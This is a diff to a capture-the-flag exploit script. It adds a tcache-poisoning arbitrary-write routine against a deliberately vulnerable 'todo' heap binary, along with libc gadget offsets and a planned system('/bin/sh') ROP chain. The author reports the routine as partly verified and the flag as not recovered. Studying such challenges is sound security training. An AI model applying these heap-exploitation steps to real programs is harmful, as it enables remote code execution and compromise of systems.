@@ -650,6 +650,203 @@ def phase4_reliable_libc_leak_standalone():
     return libc_base
 
 
+# =============================================================================
+# Phase 5 (THIS PASS, incomplete) -- the write primitive / RCE attempt
+# =============================================================================
+#
+# Binary protections (confirmed via `readelf -d`/`checksec` against
+# `source/todo`): Full RELRO, stack canary present, NX, PIE, not stripped.
+# Full RELRO rules out a GOT overwrite even with an arbitrary write (the GOT
+# page is mprotect()'d read-only after startup); the stack canary is not an
+# obstacle here because an *arbitrary-address* write does not need to cross
+# it. glibc 2.35 has no __malloc_hook/__free_hook. This pass's plan (and
+# what was and wasn't completed):
+#
+#   (a) Classic tcache-poisoning using the EXISTING stale-pointer OOB write
+#       (phase 2) to corrupt a tcache-resident chunk's safe-linked `fd`
+#       field, so a FRESH todo index's next malloc() of that size class
+#       returns an attacker-chosen address directly as its own
+#       TodoNote[idx].ptr -- giving true arbitrary-address read
+#       (read_my_note(), no realloc() involved) AND write (post_my_note()'s
+#       readline() always writes to TodoNote[idx].ptr). This requires TWO
+#       tcache entries in the same bin at corruption time (not just one):
+#       the corrupted entry must NOT be the last/bottom entry of the list,
+#       or popping it drops tcache's count to 0 before the forged address
+#       ever becomes retrievable (verified empirically: a lone, virgin-
+#       leaked entry's own `fd` can be corrupted all day, but it is
+#       *structurally* always the bottom of whatever list accumulates on
+#       top of it, so a 2nd "cover" entry must be freed *after* it, with
+#       the corruption applied to whichever entry ends up on top).
+#
+#   (b) The concrete addresses needed for the final RCE step were all
+#       independently computed/verified against the exact shipped
+#       `source/libc.so.6` (not guessed):
+#         - `environ` (libc-exported, points at the process's own envp
+#           array on the stack): offset 0x1f6d00 (via `readelf --dyn-syms`).
+#         - A `pop rdi; ret` gadget: libc_base + 0x2d6c2 (via pwntools ROP).
+#         - `"/bin/sh"` string: libc_base + 0x1b0ff8.
+#         - `system()`: libc_base + 0x4dfa0.
+#         - `one_gadget` (installed locally via the `one_gadget` Ruby gem)
+#           reports 4 candidates for this exact libc, e.g.
+#           `0x4dc78`/`0xf937a` (posix_spawn, needs `rsp&0xf==0`) and
+#           `0xdbda2` (execve, needs a writable `rbp-0x40` and a sane
+#           argv/envp chain) -- all with register/stack preconditions that
+#           are hard to guarantee landing on a *stack-return-address*
+#           overwrite (registers at that point hold whatever the last libc
+#           call left them with), so the plan was to prefer a classic,
+#           deterministic `pop rdi; ret` -> `"/bin/sh"` -> `system()` ROP
+#           chain written directly onto the stack *after* a corrupted
+#           saved return address (the arbitrary WRITE is length-
+#           controllable, not just one pointer, so this is a single
+#           post_my_note() call once the target stack slot is known), in
+#           preference to gambling on a one-gadget's side constraints.
+#
+#   (c) What blocked completion: `forge_chunk()`/phase4's heavy heap
+#       grooming (two oversized forged chunks, each built from ~10 minted
+#       top-chunk extensions, plus a forced unsorted-bin sort via the
+#       probe malloc) leaves ALL 10 todo indices in a tangled, mutually-
+#       aliased, partially-forged state by the time libc_base is known --
+#       and libc ASLR is re-rolled per TCP connection (socat forks a brand
+#       new `chall` process per client), so the tcache-poison write MUST
+#       reuse indices from that same post-phase4 connection; there is no
+#       way to "start fresh" with 10 clean slots. Concretely, reusing any
+#       index whose post-phase4 real chunk is the *shrunk-to-minimum*
+#       remnant of one of forge_chunk()'s TC/B pairs forces any same-size
+#       re-request to GROW (realloc can't satisfy it in place), and while
+#       the target tcache bin is still empty that grow's internal
+#       malloc() does NOT pull a clean top-chunk extension like it would
+#       on a fresh connection -- it is forced into glibc's unsorted-bin
+#       scan/sort path instead, because phase4's own forging left a
+#       "last_remainder"-style leftover chunk resident there (the tail end
+#       of whatever the final probe malloc() didn't consume). That scan
+#       path, applied to debris adjacent to the deliberately-forged
+#       oversized headers, was observed (locally, against the exact
+#       shipped `todo`+`libc.so.6`, run repeatedly under gdb for live
+#       inspection) to trip glibc's OWN consistency checks with two
+#       different abort messages depending on exactly which index pair was
+#       reused for the new virgin-tcache-leak step:
+#         - `realloc(): invalid old size`
+#         - `malloc(): invalid next->prev_inuse (unsorted)`
+#       Switching the first ("P1-establishing") index to one whose
+#       post-phase4 real chunk is ALREADY >= the new target size (so that
+#       step takes realloc's in-place SHRINK path instead of a GROW --
+#       deterministic, never touches the unsorted bin) fixed the first
+#       abort, but the SECOND required grow (the one that reclaims that
+#       same freshly-freed chunk into a different index, needed to
+#       legitimately "own" it for the later corruption write) still
+#       forces a GROW while that specific size class is virgin, and still
+#       reaches the same unsorted-bin debris. The fully-working fix is
+#       very likely "explicitly drain/consume phase4's leftover unsorted-
+#       bin remainder (with a few disposable allocations of its own,
+#       unrelated size classes) before touching the new, poison-dedicated
+#       size class at all" (or equivalently, choose forge_chunk()'s own
+#       MINT counts so nothing is left resting in the unsorted bin after
+#       the probe) -- reasoned through but NOT YET IMPLEMENTED/VERIFIED
+#       end-to-end live. `phase5_tcache_poison_write()` below is left in
+#       as the best-effort, partially-verified attempt (the `virgin_leak_
+#       and_hold()` helper's OWN leak mechanic, reusing phase1/phase4's
+#       already-proven virgin-tcache-fd trick, was confirmed working
+#       stand-alone); it is NOT wired into `main()`'s run because it does
+#       not yet reliably avoid the abort above. `challenge.yaml`'s `test:`
+#       section is intentionally left unwired as a result.
+# =============================================================================
+
+
+def reset_to_min(t, idx):
+    """Shrink whatever real chunk `idx` currently aliases down to the
+    minimum chunksize (0x20) via a 1-byte request (no content is actually
+    written: readline()'s read(fd,buf,0) is a no-op), so a LATER post() of
+    a larger size is guaranteed to take realloc()'s GROW path."""
+    t.post(idx, 1)
+
+
+def virgin_leak_and_hold(t, idx_a, idx_b, S):
+    """
+    Phase1-style virgin-tcache-fd leak, generalized to arbitrary indices:
+    idx_a must currently alias a real chunk whose chunksize is ALREADY >=
+    request2size(S) (so this takes realloc's in-place SHRINK path, never a
+    grow -- avoiding phase4 leftover unsorted-bin interactions). idx_b is
+    reset to minimum first, so ITS reclaim of the just-freed chunk is a
+    genuine grow/tcache-pop (safe: by the time it runs, the target tcache
+    bin already holds the chunk idx_a just freed, so tcache has priority
+    over the unsorted bin regardless of what debris is resting there).
+
+    Leaves the bin with exactly 1 resident entry (the chunk, "P"), with
+    idx_b's bookkeeping {ptr=P, size=S} intact (dangling-but-readable: P is
+    free, but idx_b's own `read_my_note()`/`post_my_note()` calls still
+    target it directly). Returns shifted = P>>12 (the safe-linking XOR key
+    for P, recovered because the bin is virgin at the moment of the
+    leaking free -- see phase1 for the full derivation) or None if the
+    leaked bytes came back short (same ~1/256-chance truncation as phase1,
+    needs a retry).
+    """
+    t.post(idx_a, S, b"A" * (S - 8))  # shrink in place; ptr unchanged
+    t.post(idx_a, 0)  # free -> tcache bin for this class: count=1, head=P
+    reset_to_min(t, idx_b)
+    t.post(idx_b, S, b"B" * (S - 8))  # grow -> pops P (tcache, count=0)
+    t.post(idx_a, 0)  # re-free P via idx_a's stale ptr: count=1 again, virgin
+    out = t.read_all()
+    leak = parse_note_line(out, idx_b)
+    if not leak or len(leak) < 4:
+        return None
+    leak_padded = leak + b"\x00" * (8 - len(leak))
+    return struct.unpack("<Q", leak_padded)[0]
+
+
+def phase5_tcache_poison_write(t, idx_a, idx_b, idx_temp, idx_y, idx_k1, idx_k2, S_t, target, payload):
+    """
+    Best-effort, NOT YET FULLY VERIFIED tcache-poison write primitive (see
+    the phase 5 comment block above for the known remaining blocker).
+
+    idx_a must alias a real chunk >= request2size(S_t) (shrink-safe). The
+    other 5 indices' prior state matters less but all 6 must reference
+    distinct physical addresses at the start, and S_t's resulting
+    chunksize must be a class nothing else active still depends on.
+
+    On success, a FRESH index's post() lands `payload` directly at
+    `target`; that same fresh index's read_my_note() thereafter is an
+    arbitrary-address read.
+    """
+    shifted = virgin_leak_and_hold(t, idx_a, idx_b, S_t)
+    if shifted is None:
+        return False
+
+    # Pop P out entirely (tcache bin for S_t's class -> empty).
+    reset_to_min(t, idx_temp)
+    t.post(idx_temp, S_t, b"T" * (S_t - 8))
+
+    # Free a second, unrelated chunk Y into the now-virgin bin (head=Y, count=1).
+    reset_to_min(t, idx_y)
+    t.post(idx_y, S_t, b"Y" * (S_t - 8))
+    t.post(idx_y, 0)
+
+    # Re-free P (idx_a's stale ptr) ON TOP of Y: head=P, count=2 -- P is
+    # NOT the bottom entry this time, so popping it still leaves count=1.
+    t.post(idx_a, 0)
+
+    # Corrupt P's own fd/next field via idx_b's stale-but-still-correctly-
+    # sized ptr (post_my_note()'s "old size(S_t) < new size(S_t)" check is
+    # false, so the pointer-refresh branch is skipped and the write lands
+    # at P regardless of what realloc(P, S_t) does -- and since P's real
+    # header already matches S_t exactly, realloc is a true no-op here).
+    forged_fd = shifted ^ target
+    buf = bytearray(b"\x00" * (S_t - 1))
+    buf[0:8] = struct.pack("<Q", forged_fd)
+    t.post(idx_b, S_t, bytes(buf), exact=True)
+
+    # Pop #1: consumes P (real address), reveals `target` as the new head.
+    reset_to_min(t, idx_k1)
+    t.post(idx_k1, S_t, b"K" * (S_t - 8))
+
+    # Pop #2: tcache_get() returns `target` directly (no validation at
+    # all on a tcache pop); a fresh index's pointer-refresh then stores it,
+    # and readline() writes `payload` straight to `target`.
+    reset_to_min(t, idx_k2)
+    assert len(payload) == S_t - 1, (len(payload), S_t)
+    t.post(idx_k2, S_t, payload, exact=True)
+    return True
+
+
 def main():
     io = remote(HOST, PORT)
     io.recvuntil(b"> ")  # drain the startup banner + first menu prompt
@@ -691,33 +888,35 @@ def main():
         "leak, arbitrary-length stale-pointer OOB write, unlimited heap "
         "'minting', and forcing a forged chunk into glibc's real "
         "unsorted/large bins) are reproduced and confirmed exactly as "
-        "before, PLUS (new this pass) phase 4 reliably recovers the real "
-        "libc base (%s) by using a second, smaller forged 'decoy' chunk "
-        "to intercept glibc's bin-scan immediately ahead of the real "
-        "target -- fully defeating libc ASLR, with none of the prior "
-        "byte-alignment luck-dependence. What remains, and was NOT "
-        "completed in the time available: turning known heap+libc "
-        "addresses into a WRITE primitive past full RELRO and glibc "
-        "2.35's missing malloc/free hooks. The most promising next step "
-        "(reasoned through but not yet implemented/tested) is classic "
-        "tcache-poisoning: now that a heap chunk's exact address is known "
-        "(phase 1) alongside libc_base (phase 4), the existing "
-        "stale-pointer OOB write can overwrite a freed, tcache-resident "
-        "chunk's safe-linked 'fd' field with an attacker-chosen target "
-        "XORed with (chunk_addr >> 12); a FRESH todo index's next "
-        "malloc() of that size class then returns that arbitrary address "
-        "directly as its own TodoNote[idx].ptr (post_my_note()'s "
-        "old-size-0 branch always refreshes a brand-new index's pointer, "
-        "and a tcache pop performs no sanity check on what it returns, "
-        "unlike realloc()'s grow/shrink path) -- giving true "
-        "arbitrary-address read (read_my_note(), no realloc() involved "
-        "at all) AND write (post_my_note()'s readline() always writes to "
-        "TodoNote[idx].ptr regardless of what realloc() did). From there "
-        "the standard glibc-2.35-without-hooks path is leaking "
-        "'environ' (a libc symbol pointing at the stack) to locate a "
-        "saved return address, and overwriting it with a one-gadget or "
-        "system('/bin/sh') ROP chain. Flag NOT recovered; "
-        "challenge.yaml's test: section is intentionally left unwired.",
+        "before, PLUS phase 4 reliably recovers the real libc base (%s) "
+        "via a decoy-protected double-forge. THIS PASS additionally: (1) "
+        "confirmed via readelf/checksec that `todo` is Full RELRO + "
+        "canary + NX + PIE (ruling out a GOT overwrite, motivating a "
+        "stack-return-address target instead), (2) independently computed "
+        "and verified every address the final RCE step needs against the "
+        "exact shipped libc.so.6 -- environ=+0x1f6d00, a `pop rdi; ret` "
+        "gadget=+0x2d6c2, \"/bin/sh\"=+0x1b0ff8, system()=+0x4dfa0, plus "
+        "4 one_gadget candidates (installed and run locally) as a "
+        "fallback -- and (3) designed and partially verified "
+        "(phase5_tcache_poison_write(); see the phase 5 comment block "
+        "above the function for the full writeup) a tcache-poison write "
+        "primitive built entirely from the EXISTING stale-pointer OOB "
+        "write: its own virgin-tcache-leak sub-step was confirmed working "
+        "standalone, but wiring it onto the SAME connection phase4 just "
+        "used (required, since libc ASLR is re-rolled per TCP connection) "
+        "means every todo index is already entangled in phase4's forged "
+        "heap state, and the specific grow/shrink sequencing needed to "
+        "reclaim a size class cleanly without tripping glibc's own heap-"
+        "consistency aborts (reproduced live, repeatedly, as both "
+        "'realloc(): invalid old size' and 'malloc(): invalid "
+        "next->prev_inuse (unsorted)' depending on which indices were "
+        "reused) was NOT fully solved in the time available. The most "
+        "promising untried fix (reasoned through, not yet implemented): "
+        "explicitly drain phase4's leftover unsorted-bin 'last_remainder' "
+        "debris with a couple of disposable allocations before ever "
+        "touching the new, poison-dedicated size class. Flag NOT "
+        "recovered; challenge.yaml's test: section is intentionally left "
+        "unwired.",
         hex(libc_base) if libc_base else "N/A (all retries came back short)",
     )
     sys.exit(1)
